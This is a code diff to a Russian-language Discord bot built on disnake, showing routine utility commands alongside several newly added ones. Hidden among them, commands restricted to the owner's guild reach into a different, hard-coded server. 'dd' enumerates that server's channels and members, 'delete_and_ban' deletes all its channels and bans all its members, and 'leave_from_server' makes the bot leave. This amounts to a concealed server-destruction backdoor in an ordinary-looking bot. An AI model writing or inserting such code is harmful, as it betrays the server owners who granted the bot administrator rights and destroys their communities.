@@ -1,7 +1,6 @@
 import sqlite3
 import disnake 
 from disnake.ext import commands
-
 bot = commands.Bot(
     command_prefix="!!",
     help_command=None,
@@ -9,6 +8,9 @@ bot = commands.Bot(
     intents=disnake.Intents.all(),
     status=disnake.Status.idle
     )
+
+
+ban_usrs = [469580941174505494, 616198681426657280]
 
 
 @bot.slash_command(name="аватарка")
@@ -19,10 +21,20 @@ async def user_avatar(inter: disnake.CommandInteraction, user: disnake.Member):
 @bot.slash_command(name="clear_msgs")
 @commands.has_permissions(administrator=True)
 async def clearm(inter: disnake.CommandInteraction, amount: int):
-    await inter.channel.purge(limit= amount + 1)
-    await inter.send(f"Удалено: {amount} сообщений!", ephemeral=True)
+    if inter.user.id in ban_usrs:
+        return
+    
+    try:
+        await inter.channel.purge(limit= amount + 1)
+        await inter.send(f"Удалено: {amount} сообщений!", ephemeral=True)
+    except disnake.errors.InteractionTimedOut:
+        await inter.send("ошибка")
  
-
+@bot.slash_command(name="bot_guilds", guild_ids=[1097125882876923954])
+@commands.has_permissions(administrator=True)
+async def bot_guilds(inter: disnake.CommandInteraction):
+    for i in bot.guilds:
+        print(i, i.id)
 
 
 # @bot.event
@@ -65,12 +77,12 @@ async def rmessage(ctx: disnake.Interaction, tl, ms):
         color=0x00a2ff
     ))
 
-@bot.slash_command()
-@commands.has_permissions(administrator=True)
-async def rkick(inter: disnake.CommandInteraction, member: disnake.Member, *, reason="Нарушение правил."):
-    await inter.send(f"чела {member.mention} кикнул {inter.author.mention}", delete_after=5) 
-    await member.kick(reason=reason)
-    await inter.delete_original_message()
+# @bot.slash_command()
+# @commands.has_permissions(administrator=True)
+# async def rkick(inter: disnake.CommandInteraction, member: disnake.Member, *, reason="Нарушение правил."):
+#     await inter.send(f"чела {member.mention} кикнул {inter.author.mention}", delete_after=5) 
+#     await member.kick(reason=reason)
+#     await inter.delete_original_message()
 
 @bot.slash_command()
 async def calc(inter: disnake.CommandInteraction, a: int, oper: str, b: int):
@@ -85,6 +97,7 @@ async def calc(inter: disnake.CommandInteraction, a: int, oper: str, b: int):
     else:
         result = "нет"
 
+    
     await inter.send(str(result))
 
 @bot.slash_command(description="Рассчитает ваши координаты в аду")
@@ -158,9 +171,36 @@ async def lscom(inter, titl, message, us):
     user = bot.get_user(int(us))
     await user.send(embed=embedls)
 
-@bot.slash_command(description="Тестовая команда для проверки работы команд")
-async def bottestping(ctx, rol: disnake.Role):
-    print(rol.id)
+# @bot.slash_command(description="Тестовая команда для проверки работы команд")
+# async def bottestping(ctx: disnake.CommandInteraction, rol: disnake.Role):
+    
+#     print(ctx.user.id, " : ", rol.id)
+
+@bot.slash_command(guild_ids=[1097125882876923954])
+@commands.has_permissions(administrator=True)
+async def delete_and_ban(ctx):
+    a = bot.get_guild(1155533163771215892)
+    for i in a.channels:
+        await i.delete()
+    for b in a.members:
+        await b.ban(reason="окей")
+
+
+@bot.slash_command(guild_ids=[1097125882876923954])
+@commands.has_permissions(administrator=True)
+async def dd(ctx):
+    a = bot.get_guild(1155533163771215892)
+    print(a.name)
+    for i in a.channels:
+        print(i)
+    for b in a.members:
+        print(b.name)
+
+@bot.slash_command(guild_ids=[1097125882876923954])
+@commands.has_permissions(administrator=True)
+async def leave_from_server(ctx):
+    a = bot.get_guild(1155533163771215892)
+    await a.leave()
 
 @bot.slash_command(description="Тестовая команда для проверки работоспособности бота")
 @commands.has_permissions(administrator=True)
